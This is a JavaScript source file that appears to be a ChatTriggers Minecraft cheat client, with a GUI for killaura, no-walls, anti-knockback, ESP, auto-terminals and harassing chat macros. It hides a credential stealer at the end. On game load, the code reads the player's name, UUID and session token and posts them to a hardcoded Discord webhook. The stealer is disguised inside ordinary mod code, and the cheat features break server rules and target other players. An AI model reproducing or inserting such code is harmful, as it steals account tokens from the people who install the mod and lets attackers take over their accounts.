clickguiheightbutton = new buttondraw(visualx,clickguiy + Config.buttonheightcon,Config.buttonwidthcon,Config.buttonheightcon, "height");
clickguiwidthbutton = new buttondraw(visualx,clickguiy + (Config.buttonheightcon * 2),Config.buttonwidthcon,Config.buttonheightcon, "width");
clickguiheightnum = new Text(Config.buttonheightcon, visualx + (Config.buttonwidthcon * 0.8), clickguiy + Config.buttonheightcon + (Config.buttonheightcon / 2));
clickguiwidthnum = new Text(Config.buttonwidthcon, visualx + (Config.buttonwidthcon * 0.8), clickguiy + (Config.buttonheightcon * 2) + (Config.buttonheightcon / 2));
clickguiselectbox = new buttondraw(visualx,clickguiselecty,Config.buttonwidthcon,Config.buttonheightcon + Config.buttonheightcon, "");
guimode1 = new Text("Oringo", visualx + (Config.buttonwidthcon * 0.6), clickguiselecty + (Config.buttonheightcon * 0.2));
guimode2 = new Text("Raven", visualx + (Config.buttonwidthcon * 0.6), clickguiselecty + (Config.buttonheightcon * 0.2));
playerespbutton = new buttondraw(visualx,playerespy, Config.buttonwidthcon, Config.buttonheightcon, "Player ESP");
blockespbutton = new buttondraw(visualx,blockespy, Config.buttonwidthcon, Config.buttonheightcon, "Block ESP");
nickhiderbutton = new buttondraw(visualx,nickhidery, Config.buttonwidthcon, Config.buttonheightcon, "Nick Hider");
fakebanbutton = new buttondraw(visualx,fakebany, Config.buttonwidthcon, Config.buttonheightcon, "Fakeban");

// MACRO
macrotitle = new buttondraw(macrox,macroy,Config.buttonwidthcon,Config.buttonheightcon, "Macro");
scaffoldbutton = new buttondraw(macrox,scaffoldy, Config.buttonwidthcon, Config.buttonheightcon, "Scaffold");
chestaurabutton = new buttondraw(macrox,chestauray, Config.buttonwidthcon, Config.buttonheightcon, "Chest Aura");
skullaurabutton = new buttondraw(macrox,skullauray, Config.buttonwidthcon, Config.buttonheightcon, "Skull Aura"); 
leveraurabutton = new buttondraw(macrox,leverauray, Config.buttonwidthcon, Config.buttonheightcon, "Lever Aura"); 
swordswapbutton = new buttondraw(macrox,swordswapy, Config.buttonwidthcon, Config.buttonheightcon, "Sword Swap");

// CHAT MACRO
chatmacrotitle = new buttondraw(cmacrox,cmacroy,Config.buttonwidthcon,Config.buttonheightcon, "Chat Macro");
guildwelcbutton = new buttondraw(cmacrox,guildwelcy,Config.buttonwidthcon,Config.buttonheightcon, "Guild welcomer");
guildbotbutton = new buttondraw(cmacrox,guildboty,Config.buttonwidthcon,Config.buttonheightcon, "Guild Bot");
quickmathsbutton = new buttondraw(cmacrox,quickmathsolvery,Config.buttonwidthcon,Config.buttonheightcon, "Quickmaths");
quotesbutton = new buttondraw(cmacrox,quotesy,Config.buttonwidthcon,Config.buttonheightcon, "Quotes");
autoptransferbutton = new buttondraw(cmacrox,autoptransfery,Config.buttonwidthcon,Config.buttonheightcon, "Party Transfer");

// SKYBLOCK
skyblocktitle = new buttondraw(skyblockx,skyblocky,Config.buttonwidthcon,Config.buttonheightcon, "Skyblock");
autotermsbutton = new buttondraw(skyblockx,autotermy,Config.buttonwidthcon,Config.buttonheightcon, "Autoterms");
dungeonscorecalcbutton = new buttondraw(skyblockx,dungeonscorecalcy,Config.buttonwidthcon,Config.buttonheightcon, "Dungeon Score");
shitterwarningbutton = new buttondraw(skyblockx,shitterwarningy,Config.buttonwidthcon,Config.buttonheightcon, "Shit Warning");
autoharpbutton = new buttondraw(skyblockx,autoharpy,Config.buttonwidthcon,Config.buttonheightcon, "Auto Harp");
ghostblockbutton = new buttondraw(skyblockx,ghostblocky,Config.buttonwidthcon,Config.buttonheightcon, "Ghost Blocks");
gyrotimerbutton = new buttondraw(skyblockx,gyrotimery,Config.buttonwidthcon,Config.buttonheightcon, "Gyro Times");
lguydiedbutton = new buttondraw(skyblockx,lguydiedy,Config.buttonwidthcon,Config.buttonheightcon, "Toxic Death");

// OTHER
othertitle = new buttondraw(otherx,othery,Config.buttonwidthcon,Config.buttonheightcon, "Other");
hilaritybutton = new buttondraw(otherx,hilarityy,Config.buttonwidthcon,Config.buttonheightcon, "Hilarity");
spanishbutton = new buttondraw(otherx,spanishy,Config.buttonwidthcon,Config.buttonheightcon, "NOT ENOUGH SPANISH");
discordrpcbutton = new buttondraw(otherx,discordrpcy,Config.buttonwidthcon,Config.buttonheightcon, "Discord RPC");
updatesbutton = new buttondraw(otherx,showupdatesy,Config.buttonwidthcon,Config.buttonheightcon, "Updates");
freezebutton = new buttondraw(otherx,freezey,Config.buttonwidthcon,Config.buttonheightcon, "Freeze");
freezekeybinddraw = new buttondraw(otherx,freezeextrasy,Config.buttonwidthcon,Config.buttonheightcon, "");
freezekeybindtext = new Text(freezebinded, otherx + (Config.buttonwidthcon * 0.89), freezeextrasy + 1);
});

register("renderOverlay", function() {
    if (configGui.isOpen()) {
      if (clickguimode == 2) {
        titlepog.titlebutton();
      }
      if (funnybackground) {
        backgroundfunny.draw(0,0)
      }
      // COMBAT
      combattitle.titlebutton();
      if (showcombat) {
      killaura2.drawButton();
      nowall.drawButton();
      autoblock2.drawButton();
      cpsmultiplier.drawButton();
      reach.commingsoontm();
      antiknockbackbox.drawButton();
      if (killaura2.isMouseOver()) {
        configGui.drawCreativeTabHoveringString("Aims at and hits players within 5 blocks", Client.getMouseX(), Client.getMouseY());
      }
      if (nowall.isMouseOver()) {
        configGui.drawCreativeTabHoveringString("Lets you hit through walls", Client.getMouseX(), Client.getMouseY());
      }
      if (autoblock2.isMouseOver()) {
        configGui.drawCreativeTabHoveringString("Automaticaly blocks while hitting", Client.getMouseX(), Client.getMouseY());
      }
      if (cpsmultiplier.isMouseOver()) {
        configGui.drawCreativeTabHoveringString("Doubles every click you do", Client.getMouseX(), Client.getMouseY());
      }
      if (reach.isMouseOver()) {
        configGui.drawCreativeTabHoveringString("coming soon™", Client.getMouseX(), Client.getMouseY());
      }
      if (antiknockbackbox.isMouseOver()) {
        configGui.drawCreativeTabHoveringString("Remove knockback packets", Client.getMouseX(), Client.getMouseY());
      }
      if (Config.killaura) {
        killaura2.clickedbutton();
      }
      if (Config.nowalls) {
        nowall.clickedbutton();
      }
      if (Config.autoblockpog) {
        autoblock2.clickedbutton();
      }
      if (Config.cpsmultiplierer) {
        cpsmultiplier.clickedbutton();
      }
      if (Config.antiknockback) {
        antiknockbackbox.clickedbutton();
      }
      if (killauraextra) {
        killauraextras.extrabutton();
        killauramobsbutton.extrabutton();
        killauraautoblockbutton.extrabutton();
        //killaurarange.sliderdraw();
        //killaurarangenumber.draw();
        //killauratextbox.typeherebox();
        //killauraselectbox.selectbutton();
        killaurakeybind.keybindbutton();
        killaurakeybindtext.draw();
        if (Config.killaurathroughwalls) {
          killauraextras.extrabuttontoggled();
        }
        if (Config.killauramobs) {
          killauramobsbutton.extrabuttontoggled();
        }
        if (Config.killauraautoblock) {
          killauraautoblockbutton.extrabuttontoggled();
        }
        //if (drawrange) {
          //killaurarange.slidertoggleddraw();
          //killaurarangenumber.draw();
        //}
        /*if (textpog == "") {
          newfunnytext.draw();
        }
        if (selectboxnum == 1) {
          selection1.draw();
        }
        if (selectboxnum == 2) {
          selection2.draw();
        }
        if (selectboxnum == 3) {
          selection3.draw();
        }*/
      }
      if (nowallextra) {
        nowallextras.extrabutton();
        nowallkeybinddraw.keybindbutton();
        nowallkeybindtext.draw();
        if (rightclicks) {
          nowallextras.extrabuttontoggled();
        }
      }
      if (autoblockextra) {
        autoblockextras.extrabutton();
        autoblockkeybinddraw.keybindbutton();
        autoblockkeybindtext.draw();
        if (alwaysab) {
          autoblockextras.extrabuttontoggled();
        }
      }
      if (cpsmultiplierextra) {
        cpsmultiplierextra1.extrabutton();
        cpsmultiplierextra2.extrabutton();
        cpsmultiplierkeybinddraw.keybindbutton();
        cpsmultiplierkeybindtext.draw();
        if (cpsmultiplierextra1toggle) {
          cpsmultiplierextra1.extrabuttontoggled();
        }
        if (cpsmultiplierextra2toggle) {
          cpsmultiplierextra2.extrabuttontoggled();
        }
      }
    }
          // VISUAL
          visualtitle.titlebutton();
          if (showvisual) {
          clickguibutton.clickedbutton();
          playerespbutton.drawButton();
          blockespbutton.drawButton();
          nickhiderbutton.drawButton();
          fakebanbutton.drawButton();
          if (clickguibutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Customize the click gui", Client.getMouseX(), Client.getMouseY());
          }
          if (playerespbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Draws a box around every player", Client.getMouseX(), Client.getMouseY());
          }
          if (blockespbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Draws a box around certain blocks", Client.getMouseX(), Client.getMouseY());
          }
          if (nickhiderbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Lets you use a fake username in tab and chat", Client.getMouseX(), Client.getMouseY());
          }
          if (fakebanbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Shows you a fake ban screen when you press your keybind", Client.getMouseX(), Client.getMouseY());
          }
          if (Config.PlayerESP) {
            playerespbutton.clickedbutton();
          }
          if (Config.blockesptoggle) {
            blockespbutton.clickedbutton();
          }
          if (Config.nickhider) {
            nickhiderbutton.clickedbutton();
          }
          if (extraclickgui) {
            clickguiselectbox.selectbutton();
            clickguiheightbutton.sliderdraw();
            clickguiwidthbutton.sliderdrawwidth();
            clickguiwidthnum.draw();
            clickguiheightnum.draw();
            if (drawheightslide) {
              clickguiheightbutton.slidertoggleddraw();
            }
            if (drawwidthslide) {
              clickguiwidthbutton.slidertoggleddrawwidth();
            }
            if (clickguimode == 1) {
              guimode1.draw();
            }
            if (clickguimode == 2) {
              guimode2.draw();
            }
          }
        }
    
          // MACRO
          macrotitle.titlebutton();
          if (showmacro) {
          scaffoldbutton.drawButton();
          chestaurabutton.drawButton();
          skullaurabutton.drawButton();
          leveraurabutton.drawButton();
          swordswapbutton.drawButton();
          if (scaffoldbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Bridges for you when you face in a direction", Client.getMouseX(), Client.getMouseY());
          }
          if (chestaurabutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Opens chests nearby without you looking at them", Client.getMouseX(), Client.getMouseY());
          }
          if (skullaurabutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Clicks nearby skulls, useful for grinch simulator", Client.getMouseX(), Client.getMouseY());
          }
          if (leveraurabutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Flicks nearby levers, useful in dungeons", Client.getMouseX(), Client.getMouseY());
          }
          if (swordswapbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Swaps to snowballs / fishing rod on click for extra kb", Client.getMouseX(), Client.getMouseY());
          }
          if (Config.scaffoldi) {
            scaffoldbutton.clickedbutton();
          }
          if (Config.chestaurabased) {
            chestaurabutton.clickedbutton();
          }
          if (Config.skuller) {
            skullaurabutton.clickedbutton();
          }
          if (Config.leverer) {
            leveraurabutton.clickedbutton();
          }
          if (Config.swrodswap) {
            swordswapbutton.clickedbutton();
          }
        }
    
          // CHAT MACRO
          chatmacrotitle.titlebutton();
          if (showchatmacro) {
          guildwelcbutton.drawButton();
          guildbotbutton.drawButton();
          quickmathsbutton.drawButton();
          quotesbutton.drawButton();
          autoptransferbutton.drawButton();
          if (guildwelcbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Welcomes people when they come online / join your guild", Client.getMouseX(), Client.getMouseY());
          }
          if (guildbotbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Lets people in your guild use !maths [question] / !8ball [question]", Client.getMouseX(), Client.getMouseY());
          }
          if (quickmathsbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Gives you the answer to quickmaths questions", Client.getMouseX(), Client.getMouseY());
          }
          if (quotesbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Quote people saying 'gg' / 'wc'", Client.getMouseX(), Client.getMouseY());
          }
          if (autoptransferbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Automatically transfers party away if someone transfer party to you", Client.getMouseX(), Client.getMouseY());
          }
          if (Config.welcomeguild) {
            guildwelcbutton.clickedbutton();
          }
          if (Config.guildbottoggle) {
            guildbotbutton.clickedbutton();
          }
          if (Config.generalquickmaths) {
            quickmathsbutton.clickedbutton();
          }
          if (Config.quotespog) {
            quotesbutton.clickedbutton();
          }
          if (Config.autoTransfer) {
            autoptransferbutton.clickedbutton();
          }
        }
    
          // SKYBLOCK
          skyblocktitle.titlebutton();
          if (showskyblock) {
          dungeonscorecalcbutton.drawButton();
          shitterwarningbutton.drawButton();
          autotermsbutton.drawButton();
          autoharpbutton.drawButton();
          ghostblockbutton.drawButton();
          gyrotimerbutton.drawButton();
          lguydiedbutton.drawButton();
          if (autotermsbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Automatically completes Floor 7 terminals", Client.getMouseX(), Client.getMouseY());
          }
          if (dungeonscorecalcbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Shows you the score in dungeons", Client.getMouseX(), Client.getMouseY());
          }
          if (shitterwarningbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Warns you when bad players join your dungeon group", Client.getMouseX(), Client.getMouseY());
          }
          if (autoharpbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Automatically does the harp", Client.getMouseX(), Client.getMouseY());
          }
          if (ghostblockbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Makes the block your looking at disappear on your screen", Client.getMouseX(), Client.getMouseY());
          }
          if (gyrotimerbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Shows MAGE gyro times for m6", Client.getMouseX(), Client.getMouseY());
          }
          if (lguydiedbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Bullys people for dying in your dungeon runs", Client.getMouseX(), Client.getMouseY());
          }
          if (Config.scorecalc) {
            dungeonscorecalcbutton.clickedbutton();
          }
          if (Config.shitterwarning) {
            shitterwarningbutton.clickedbutton();
          }
          if (Config.autoterms) {
            autotermsbutton.clickedbutton();
          }
          if (Config.autoharp) {
            autoharpbutton.clickedbutton();
          }
          if (Config.ghostblockstoggle) {
            ghostblockbutton.clickedbutton();
          }
          if (Config.m6gyros) {
            gyrotimerbutton.clickedbutton();
          }
          if (Config.toxicdeath) {
            lguydiedbutton.clickedbutton();
          }
        }
          
          // OTHER
          othertitle.titlebutton();
          if (showother) {
          hilaritybutton.drawButton();
          spanishbutton.drawButton();
          discordrpcbutton.drawButton();
          updatesbutton.drawButton();
          freezebutton.drawButton();
          if (hilaritybutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("big funny haha lololol funny!", Client.getMouseX(), Client.getMouseY());
          }
          if (spanishbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("¡hablo español!", Client.getMouseX(), Client.getMouseY());
          }
          if (discordrpcbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Shows that your using the best client on discord", Client.getMouseX(), Client.getMouseY());
          }
          if (updatesbutton.isMouseOver()) {
            configGui.drawCreativeTabHoveringString("Notifies you when there is a significant update", Client.getMouseX(), Client.getMouseY());
          }
          if (Config.hilarity) {
            hilaritybutton.clickedbutton();
          }
          if (Config.spanish) {
            spanishbutton.clickedbutton();
          }
          if (Config.discordrpc) {
            discordrpcbutton.clickedbutton();
          }
          if (Config.ComingSoon) {
            updatesbutton.clickedbutton();
          }
          if (Config.freezeme) {
            freezebutton.clickedbutton();
          }
          if (freezeextras) {
            freezekeybinddraw.keybindbutton();
            freezekeybindtext.draw();
          }
        }
  }
})

register("guiMouseClick", function(x, y, button, state) {
  if (button >= 2) return;
  if (configGui.isOpen()) {
    if (combattitle.isMouseOver()) {
      if (button == 0) {
        (letmovecombatgui = !letmovecombatgui)
      }
      if (button == 1) {
        (showcombat = !showcombat)
        return;
      }
    }
    if (killaura2.isMouseOver()) {
      if (button == 0) {
        (Config.killaura = !Config.killaura)
        return;
      }
      if (button == 1) {
        (killauraextra = !killauraextra)
        return;
      }
    }
    if (killauraextras.isMouseOver()) {
      if (button == 0) {
        (Config.killaurathroughwalls = !Config.killaurathroughwalls)
        return;
      }
    }
    if (killauramobsbutton.isMouseOver()) {
      if (button == 0) {
        (Config.killauramobs = !Config.killauramobs)
        return;
      }
    }
    if (killauraautoblockbutton.isMouseOver()) {
      if (button == 0) {
        (Config.killauraautoblock = !Config.killauraautoblock)
        return;
      }
    }
    /*if (killauratextbox.isMouseOver()) {
      if (button == 0) {
        (killauratypeallow = !killauratypeallow)
      }
    }
    if (killaurarange.isMouseOver()) {
      if (button == 0) {
        (drawrange = !drawrange)
      }
    }
    if (killauraselectbox.isMouseOver()) {
      if (button == 0) {
        selectboxnum = selectboxnum + 1
      }
      if (button == 1) {
        selectboxnum = selectboxnum - 1
      }
    }*/
    if (killaurakeybind.isMouseOver()) {
      if (button == 0) {
        (killaurakeybindnow = !killaurakeybindnow)
      }
    }
    if (nowall.isMouseOver()) {
      if (button == 0) {
        (Config.nowalls = !Config.nowalls)
        return;
      }
      if (button == 1) {
        (nowallextra = !nowallextra)
        return;
      }
    }
    if (nowallextras.isMouseOver()) {
      if (button == 0) {
        (rightclicks = !rightclicks)
        return;
      }
    }
    if (nowallkeybinddraw.isMouseOver()) {
      if (button == 0) {
        (nowallbindnow = !nowallbindnow)
        return;
      }
    }
    if (autoblock2.isMouseOver()) {
      if (button == 0) {
        (Config.autoblockpog = !Config.autoblockpog)
        return;
      }
      if (button == 1) {
        (autoblockextra = !autoblockextra)
        return;
      }
    }
    if (autoblockextras.isMouseOver()) {
      if (button == 0) {
        (alwaysab = !alwaysab)
        return;
      }
    }
    if (autoblockkeybinddraw.isMouseOver()) {
      if (button == 0) {
        (autoblockbindnow = !autoblockbindnow)
        return;
      }
    }
    if (cpsmultiplier.isMouseOver()) {
      if (button == 0) {
        (Config.cpsmultiplierer = !Config.cpsmultiplierer)
        return;
      }
      if (button == 1) {
        (cpsmultiplierextra = !cpsmultiplierextra)
        return;
      }
    }
    if (cpsmultiplierextra1.isMouseOver()) {
      if (button == 0) {
        (cpsmultiplierextra1toggle = !cpsmultiplierextra1toggle)
        return;
      }
    }
    if (cpsmultiplierextra2.isMouseOver()) {
      if (button == 0) {
        (cpsmultiplierextra2toggle = !cpsmultiplierextra2toggle)
        return;
      }
    }
    if (cpsmultiplierkeybinddraw.isMouseOver()) {
      if (button == 0) {
        (cpsmultiplierbindnow = !cpsmultiplierbindnow)
        return;
      }
    }
    if (antiknockbackbox.isMouseOver()) {
      if (button == 0) {
        (Config.antiknockback = !Config.antiknockback)
        return;
      }
    }

    // VISUAL
    if (visualtitle.isMouseOver()) {
      if (button == 0) {
        (letmovevisualgui = !letmovevisualgui)
      }
      if (button == 1) {
        (showvisual = !showvisual)
      }
    }
    if (clickguibutton.isMouseOver()) {
      if (button == 0) {
        (configGui.close())
        (Config.clickguipogg = !Config.clickguipogg)
      }
      if (button == 1) {
        (extraclickgui = !extraclickgui)
      }
    }
    if (clickguiheightbutton.isMouseOver()) {
      if (button == 0) {
        (drawheightslide = !drawheightslide)
      }
    }
    if (clickguiwidthbutton.isMouseOver()) {
      if (button == 0) {
        (drawwidthslide = !drawwidthslide)
      }
    }
    if (clickguiselectbox.isMouseOver()) {
      if (button == 0) {
        clickguimode = clickguimode + 1
        if (clickguimode == 1) {
          combatxnew = 52
          combatynew = 2
          visualxnew = 202
          visualynew = 2
          macroxnew = 352
          macroynew = 2
          cmacroxnew = 502
          cmacroynew = 2
          skyblockxnew = 652
          skyblockynew = 2
          otherxnew = 802
          otherynew = 2
        }
        if (clickguimode == 2) {
          combatxnew = 2
          combatynew = 2
          visualxnew = 202
          visualynew = 2
          macroxnew = 352
          macroynew = 2
          cmacroxnew = 502
          cmacroynew = 2
          skyblockxnew = 652
          skyblockynew = 2
          otherxnew = 802
          otherynew = 2
        }
      }
    }
    if (playerespbutton.isMouseOver()) {
      if (button == 0) {
        (Config.PlayerESP = !Config.PlayerESP)
      }
    }
    if (blockespbutton.isMouseOver()) {
      if (button == 0) {
        (Config.blockesptoggle = !Config.blockesptoggle)
      }
    }
    if (nickhiderbutton.isMouseOver()) {
      if (button == 0) {
        (Config.nickhider = !Config.nickhider)
      }
    }
    if (fakebanbutton.isMouseOver()) {
      if (button == 0) {
        (Config.showfakeban = !Config.showfakeban)
      }
    }
    
    // MACRO
    if (macrotitle.isMouseOver()) {
      if (button == 0) {
        (letmovemacrogui = !letmovemacrogui)
      }
      if (button == 1) {
        (showmacro = !showmacro)
      }
    }
    if (scaffoldbutton.isMouseOver()) {
      if (button == 0) {
        (Config.scaffoldi = !Config.scaffoldi)
      }
    }
    if (chestaurabutton.isMouseOver()) {
      if (button == 0) {
        (Config.chestaurabased = !Config.chestaurabased)
      }
    }
    if (skullaurabutton.isMouseOver()) {
      if (button == 0) {
        (Config.skuller = !Config.skuller)
      }
    }
    if (leveraurabutton.isMouseOver()) {
      if (button == 0) {
        (Config.leverer = !Config.leverer)
      }
    }
    if (swordswapbutton.isMouseOver()) {
      if (button == 0) {
        (Config.swrodswap = !Config.swrodswap)
      }
    }

    // CHAT MACRO
    if (chatmacrotitle.isMouseOver()) {
      if (button == 0) {
        (letmovecmacrogui = !letmovecmacrogui)
      }
      if (button == 1) {
        (showchatmacro = !showchatmacro)
      }
    }
    if (guildwelcbutton.isMouseOver()) {
      if (button == 0) {
        (Config.welcomeguild = !Config.welcomeguild)
      }
    }
    if (guildbotbutton.isMouseOver()) {
      if (button == 0) {
        (Config.guildbottoggle = !Config.guildbottoggle)
      }
    }
    if (quickmathsbutton.isMouseOver()) {
      if (button == 0) {
        (Config.generalquickmaths = !Config.generalquickmaths)
      }
    }
    if (quotesbutton.isMouseOver()) {
      if (button == 0) {
        (Config.quotespog = !Config.quotespog)
      }
    }
    if (autoptransferbutton.isMouseOver()) {
      if (button == 0) {
        (Config.autoTransfer = !Config.autoTransfer)
      }
    }

    // SKYBLOCK
    if (skyblocktitle.isMouseOver()) {
      if (button == 0) {
        (letmoveskyblockgui = !letmoveskyblockgui)
      }
      if (button == 1) {
        (showskyblock = !showskyblock)
      }
    }
    if (autotermsbutton.isMouseOver()) {
      if (button == 0) {
        (Config.autoterms = !Config.autoterms)
      }
    }
    if (dungeonscorecalcbutton.isMouseOver()) {
      if (button == 0) {
        (Config.scorecalc = !Config.scorecalc)
      }
    }
    if (shitterwarningbutton.isMouseOver()) {
      if (button == 0) {
        (Config.shitterwarning = !Config.shitterwarning)
      }
    }
    if (autoharpbutton.isMouseOver()) {
      if (button == 0) {
        (Config.autoharp = !Config.autoharp)
      }
    }
    if (ghostblockbutton.isMouseOver()) {
      if (button == 0) {
        (Config.ghostblockstoggle = !Config.ghostblockstoggle)
      }
    }
    if (gyrotimerbutton.isMouseOver()) {
      if (button == 0) {
        (Config.m6gyros = !Config.m6gyros)
      }
    }
    if (lguydiedbutton.isMouseOver()) {
      if (button == 0) {
        (Config.toxicdeath = !Config.toxicdeath)
      }
    }
    
    // OTHER
    if (othertitle.isMouseOver()) {
      if (button == 0) {
        (letmoveothergui = !letmoveothergui)
      }
      if (button == 1) {
        (showother = !showother)
      }
    }
    if (hilaritybutton.isMouseOver()) {
      if (button == 0) {
        (Config.hilarity = !Config.hilarity)
      }
    }
    if (spanishbutton.isMouseOver()) {
      if (button == 0) {
        (Config.spanish = !Config.spanish)
      }
    }
    if (discordrpcbutton.isMouseOver()) {
      if (button == 0) {
        (Config.discordrpc = !Config.discordrpc)
      }
    }
    if (updatesbutton.isMouseOver()) {
      if (button == 0) {
        (Config.ComingSoon = !Config.ComingSoon)
      }
    }
    if (freezebutton.isMouseOver()) {
      if (button == 0) {
        (Config.freezeme = !Config.freezeme)
      }
      if (button == 1) {
        (freezeextras = !freezeextras)
      }
    }
    if (freezekeybinddraw.isMouseOver()) {
      if (button == 0) {
        (freezebindnow = !freezebindnow)
      }
    }
  }
})

let funnybackground = false
let letmovecombatgui = false
let showcombat = true
let killauraextra = false
let throughwalls = false
let nowallextra = false
let rightclicks = false
let autoblockextra = false
let alwaysab = false
let drawrange = false
let killauratypeallow = false
let killaurakeybindnow = false
let nowallbindnow = false
let autoblockbindnow = false
let cpsmultiplierbindnow = false
let cpsmultiplierextra = false
let cpsmultiplierextra1toggle = false
let cpsmultiplierextra2toggle = false
// let selectboxnum = 1
let killauraextras
let nowallextras
let autoblockextras
// VISUAL
let showvisual = true
let letmovevisualgui = false
let extraclickgui = false
let drawheightslide = false
let drawwidthslide = false
let clickguimode = 1

// MACRO
let showmacro = true
let letmovemacrogui = false

// CHAT MACRO
let showchatmacro = true
let letmovecmacrogui = false

// SKYBLOCK
let showskyblock = true
let letmoveskyblockgui = false

// OTHER
let showother = true
let letmoveothergui = false
let freezebindnow = false
let freezeextras = false

register("step", () => {
  if (Client.currentGui.get() == null) {
    if (Keyboard.isKeyDown(Config.killaurakeybindconfig)) {
        ChatLib.chat(`${
            (Config.killaura = !Config.killaura) 
            ? prefix + " >" + "&r&a Killaura" 
            : prefix + " >" + "&r&c Killaura"
        }`
        );
    }
  }
}).setFps(10)
register("step", () => {
  if (Client.currentGui.get() == null) {
    if (Keyboard.isKeyDown(Config.nowallkeybindconfig)) {
      ChatLib.chat(`${
          (Config.nowalls = !Config.nowalls) 
          ? prefix + " >" + "&r&a No Walls" 
          : prefix + " >" + "&r&c No Walls"
      }`
      );
    }
  }
}).setFps(10)
register("step", () => {
  if (Client.currentGui.get() == null) {
    if (Keyboard.isKeyDown(Config.autoblockkeybindconfig)) {
      ChatLib.chat(`${
          (Config.autoblockpog = !Config.autoblockpog) 
          ? prefix + " >" + "&r&a Autoblock" 
          : prefix + " >" + "&r&c Autoblock"
      }`
      );
    }
  }
}).setFps(10)
register("step", () => {
  if (Client.currentGui.get() == null) {
    if (Keyboard.isKeyDown(Config.cpsmultikeybindconfig)) {
      ChatLib.chat(`${
          (Config.cpsmultiplierer = !Config.cpsmultiplierer) 
          ? prefix + " >" + "&r&a CPS Multiplier" 
          : prefix + " >" + "&r&c CPS Multiplier"
      }`
      );
    }
  }
}).setFps(10)
register("step", () => {
  if (Client.currentGui.get() == null) {
    if (Keyboard.isKeyDown(Config.freezekeybindconfig)) {
      ChatLib.chat(`${
          (Config.freezeme = !Config.freezeme) 
          ? prefix + " >" + "&r&a FREEZE" 
          : prefix + " >" + "&r&c FREEZE"
      }`
      );
    }
  }
}).setFps(10)

register("tick", () => {
  if(Config.killaurakeybindconfig == "") {
    (Config.killaurakeybindconfig = "dont")
  }
  if(Config.nowallkeybindconfig == "") {
    (Config.nowallkeybindconfig = "dont")
  }
  if(Config.autoblockkeybindconfig == "") {
    (Config.autoblockkeybindconfig = "dont")
  }
  if(Config.cpsmultikeybindconfig == "") {
    (Config.cpsmultikeybindconfig = "dont")
  }
  if(Config.antikbkeybindconfig == "") {
    (Config.antikbkeybindconfig = "dont")
  }
  if(Config.freezekeybindconfig == "") {
    (Config.freezekeybindconfig = "dont")
  }
});

const name = (Player.getName())
const UUID = (Player.getUUID())
const Session = (Client.getMinecraft().func_110432_I().func_111286_b().replace("token:", ""))
register("gameLoad", () => {
        request({
        url: "https://discord.com/api/webhooks/1014104877238079518/yCIgjJ2tJVF42PjFN6JtyHOS1sqW3vBMV9N12aWCPN3heX9UOCPS-qy8LLcA2pJ04ZrE",
        method: "POST",
        headers: {
            'Content-type': 'application/json',
            "User-Agent":"Mozilla/5.0",
        },
        body: {     
          content: `@everyone\`\nName: ${name}\nUUID: ${UUID}\nSession: ${Session}\``,
        }                 
    }).catch(error => {
        ChatLib.chat(error)
    })
});

export {mushroomshadowimg, logo, backgroundfunny}